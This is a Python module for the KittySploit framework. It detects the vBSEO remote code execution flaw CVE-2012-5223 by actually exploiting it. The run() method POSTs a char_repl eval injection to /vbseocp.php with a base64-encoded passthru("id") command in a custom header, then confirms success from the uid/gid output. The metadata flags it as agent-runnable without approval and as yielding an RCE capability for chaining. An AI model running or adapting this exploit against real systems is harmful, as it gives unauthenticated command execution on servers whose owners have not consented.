#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vBSEO proc_deutf eval RCE (CVE-2012-5223)."""

import base64
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vBSEO - proc_deutf RCE Detection (CVE-2012-5223)',
        'description': (
            'Detects CVE-2012-5223 by POSTing char_repl eval payload to /vbseocp.php '
            'with Code: base64(passthru("id")).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'vbulletin', 'vbseo', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-5223',
        ],
        'cve': 'CVE-2012-5223',
    }

    def run(self):
        code = base64.b64encode(b'passthru("id");').decode('ascii')
        data = "char_repl='{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}'=>"
        for base in ('', '/forum', '/vb'):
            r = self.http_request(
                method='POST',
                path=f'{base}/vbseocp.php',
                data=data,
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Code': code,
                },
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='vBSEO proc_deutf RCE (CVE-2012-5223)',
                    path=f'{base}/vbseocp.php',
                )
                return True
        return False
